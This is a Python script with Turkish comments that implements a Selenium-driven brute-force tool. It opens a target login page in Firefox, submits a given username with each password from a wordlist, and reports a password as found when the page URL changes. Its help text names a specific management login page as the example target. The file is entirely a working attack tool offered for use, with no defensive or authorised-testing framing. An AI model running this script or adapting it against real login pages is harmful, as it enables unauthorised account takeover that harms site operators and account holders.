import argparse
import sys
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.firefox import GeckoDriverManager

def main():
    parser = argparse.ArgumentParser(description='Selenium tabanlı görsel bruteforce aracı.')
    parser.add_argument('url', help='Hedef web sitesinin URL\'si (örn: https://mgmt.yenihavale.net/login)')
    parser.add_argument('-u', '--username', required=True, help='Kullanılacak kullanıcı adı.')
    parser.add_argument('-w', '--wordlist', required=True, help='Denenecek şifrelerin bulunduğu dosya.')

    args = parser.parse_args()

    print(f"[*] Hedef: {args.url}")
    print(f"[*] Kullanıcı Adı: {args.username}")
    print(f"[*] Şifre Listesi: {args.wordlist}")
    print("[*] Tarayıcı başlatılıyor...")

    try:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"Hata: '{args.wordlist}' kelime listesi dosyası bulunamadı.", file=sys.stderr)
        sys.exit(1)

    # Selenium WebDriver'ı başlat
    try:
        # GeckoDriverManager, Firefox için sürücüyü otomatik olarak indirip kurar.
        service = FirefoxService(GeckoDriverManager().install())
        driver = webdriver.Firefox(service=service)
    except Exception as e:
        print(f"WebDriver başlatılırken bir hata oluştu: {e}", file=sys.stderr)
        print("Lütfen Firefox tarayıcısının sisteminizde kurulu olduğundan emin olun.", file=sys.stderr)
        sys.exit(1)


    found_password = None
    for password in passwords:
        if found_password:
            break
        
        try:
            print(f"[*] Denenen şifre: {password}")
            driver.get(args.url)

            # --- ELEMENT SEÇİCİLERİ ---
            # Modern web uygulamaları dinamik olarak ID veya class üretebilir.
            # Bu seçiciler çalışmazsa, tarayıcınızda sayfaya sağ tıklayıp "İncele" (Inspect)
            # seçeneğini kullanarak doğru seçicileri bulmanız gerekir.
            # Genellikle 'name', 'id', 'placeholder' veya 'type' gibi öznitelikler iyi bir başlangıçtır.
            
            # Örnek seçiciler:
            USERNAME_SELECTOR = (By.CSS_SELECTOR, "input[name='username']")
            PASSWORD_SELECTOR = (By.CSS_SELECTOR, "input[name='password']")
            # Butonun metni "Giriş Yap" veya benzeri bir şey olabilir.
            LOGIN_BUTTON_SELECTOR = (By.CSS_SELECTOR, "button[type='submit']")

            # Sayfanın yüklenmesini ve elementlerin görünür olmasını bekle
            wait = WebDriverWait(driver, 10)
            
            username_field = wait.until(EC.visibility_of_element_located(USERNAME_SELECTOR))
            password_field = wait.until(EC.visibility_of_element_located(PASSWORD_SELECTOR))
            login_button = wait.until(EC.element_to_be_clickable(LOGIN_BUTTON_SELECTOR))

            # Alanları temizle ve bilgileri gir
            username_field.clear()
            username_field.send_keys(args.username)
            
            password_field.clear()
            password_field.send_keys(password)

            # Giriş yap butonuna tıkla
            login_button.click()
            
            # Giriş denemesinden sonra sayfanın değişip değişmediğini kontrol et.
            # Başarılı bir girişten sonra URL'nin değiştiğini varsayıyoruz.
            # 5 saniye içinde URL'nin aynı kalıp kalmadığını kontrol ediyoruz.
            time.sleep(5) 
            
            if driver.current_url != args.url:
                print(f"\n[+] BAŞARILI! Şifre bulundu: {password}")
                found_password = password
                print("Tarayıcı 30 saniye sonra kapanacak...")
                time.sleep(30) # Başarıyı görmek için bekle
                break # Döngüden çık

        except Exception as e:
            print(f"Hata: '{password}' şifresiyle deneme yapılırken bir sorun oluştu. Element seçicileri yanlış olabilir.")
            # print(f"Detay: {e}") # Hata ayıklama için bu satırı açabilirsiniz.
            continue
            
    if not found_password:
        print("\n[-] Şifre bulunamadı.")

    driver.quit()
    print("[*] Araç kapatıldı.")

if __name__ == '__main__':
    main() 